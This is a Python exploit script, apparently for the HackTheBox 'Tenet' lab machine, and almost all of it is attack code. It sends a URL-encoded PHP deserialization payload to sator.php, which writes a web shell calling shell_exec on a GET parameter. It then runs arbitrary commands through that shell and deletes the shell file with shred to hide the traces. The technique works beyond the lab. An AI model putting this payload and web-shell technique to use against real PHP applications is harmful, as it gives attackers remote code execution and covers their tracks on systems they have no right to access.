#!/usr/bin/python3

import requests, time, argparse
from pwn import *

def arguments():
    parse = argparse.ArgumentParser(description='Remote Command Execution - Deserilization attack - Tenet HackTheBox')
    parse.add_argument('-c', dest='command', type=str, default='whoami;hostname', help='Command to execute. (default: whoami;hostname)')
    return parse.parse_args()

def create_file_to_RCE():
    session = requests.Session()
    url = "http://10.10.10.223/sator.php?arepo="

    p1 = log.progress("Creating file ajaTEncontre.php")
    time.sleep(1)

    # Decode:  O:14:"DatabaseExport":2:{s:9:"user_file";s:16:"ajaTEncontre.php";s:4:"data";s:58:"<?php $command=shell_exec($_GET['xmd']); echo $command; ?>";}
    payload = 'O:14:"DatabaseExport":2:{s:9:"user_file";s:16:"ajaTEncontre.php";s:4:"data";s:58:"%3C%3Fphp%20%24command%3Dshell_exec%28%24_GET%5B%27xmd%27%5D%29%3B%20echo%20%24command%3B%20%3F%3E";}'

    r = session.get(url + payload)

    if r.status_code == 200:
        p1.success("Done")
        time.sleep(1)
        url = "http://10.10.10.223/ajaTEncontre.php?xmd="
    else:
        p1.failure("Upss failed, try again or review the payload, maybe a comma was losed :P")
        exit(1)

    # Execute external command
    p2 = log.progress("Executing %s" % (args.command))
    time.sleep(2)

    execute_command(url, args.command)
    p2.success("Done")

    # Delete file
    command = "shred -zun 11 ajaTEncontre.php"
    execute_command(url, command)

    print("[+] k3eEp BReaK1n6!!")

def execute_command(url, command):
    session = requests.Session()

    try:
        r = session.get(url + command, timeout=5)
        if r.text == "":
            pass
        else:
            print("\n" + r.text)
    except requests.exceptions.ReadTimeout:
        pass

args = arguments()
create_file_to_RCE()
